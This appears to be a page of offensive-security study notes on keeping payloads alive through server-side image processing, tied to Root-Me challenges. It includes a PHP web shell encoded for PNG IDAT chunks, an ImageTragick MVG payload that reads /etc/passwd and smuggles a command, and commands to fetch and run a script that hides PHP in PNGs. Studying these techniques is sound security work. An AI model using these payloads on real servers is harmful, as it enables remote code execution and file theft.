# Image Transformations

<div class="row row-cols-lg-2"><div>

Images may be processed by the server, such as being resized, compressed, etc. These operations will lead to pixels being deleted and the payload being lost. The [GD library](https://www.php.net/manual/en/book.image.php) is commonly used in PHP.

* [Astrolock](https://github.com/synacktiv/astrolock/) (Vulnerable APP)
* [Overview of the different techniques](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) (2022)
* [French article extending the original article](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/) (2014)
* [Original Article](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/) (2012)

The original author compiled the sequence `a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310` that corresponds to `<?=$_GET[0]($_POST[1]);?>` after applying the  PNG Filters and a compression algorithm on the image.

➡️ Use [huntergregal IDAT generator](https://github.com/huntergregal/PNG-IDAT-Payload-Generator) <small>(0.2k ⭐)</small> or [pixload](https://github.com/sighook/pixload)<small>(1.2k ⭐)</small> for XSS. Use [Astrolock generators](https://github.com/synacktiv/astrolock/tree/main/payloads/generators) <small>(0.1k ⭐)</small> for PHP code injection in PNGs.

#### ImageMagick File Conversation — Imagetragick CVEs

[![imagick](../../../../../_badges/rootme/realist/imagick.svg)](https://www.root-me.org/en/Challenges/Realist/Imagick)

Back in 2016, [4 critical CVEs](https://imagetragick.com/) and [one in 2020](https://www.synacktiv.com/en/publications/playing-with-imagetragick-like-its-2016.html) were discovered in ImageMagick allowing file reading/writing, SSRF, and RCE.

```perl
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
fill 'url(https://example.com/image.jpg"; [...]"'
pop graphic-context
```

<br>

#### PLTE Chunk

Not covered for now.
</div><div>

#### Imagick Image Resizing

Not tested. It erases tEXT chunks "comment", modify some known tEXT chunks, and keep the others as-if.

```py
import sys
import PIL         # pip install pillow
import pillow_heif # pip install pillow-heif

image = PIL.Image.open("input.jpg")
if 'properties' not in image.info:
	image.info['properties'] = {}
image.info['properties']['PoC'] = '<payload here>'
image.save("output.jpg", format="JPEG", **image.info)
```

<br>

#### GD Image Resizing — PHP

[![samcms](../../../../../_badges/rootme/realist/samcms.svg)](https://www.root-me.org/en/Challenges/Realist/SamCMS)

If the uploaded image was resized to a fixed size that is less than 61 pixels, there are reliable ways to inject PHP code that survives resizing. There are multiple PHP scripts for 40x40 and 55x55.

I wrote a Python script that requires the `pillow` library. It supports images up to 61x61 as per the article from 2014.

```ps
$ pip install pillow
$ wget "https://raw.githubusercontent.com/QuentinRa/blog.quentinra.dev/master/cybersecurity/red-team/s3.exploitation/vulns/web/files/gd_hide_php_in_png.py"
$ python3 gd_hide_php_in_png.py --size 55
OK
$ cat in.png  # the image to upload
$ cat out.png # the image after resizing
```
</div></div>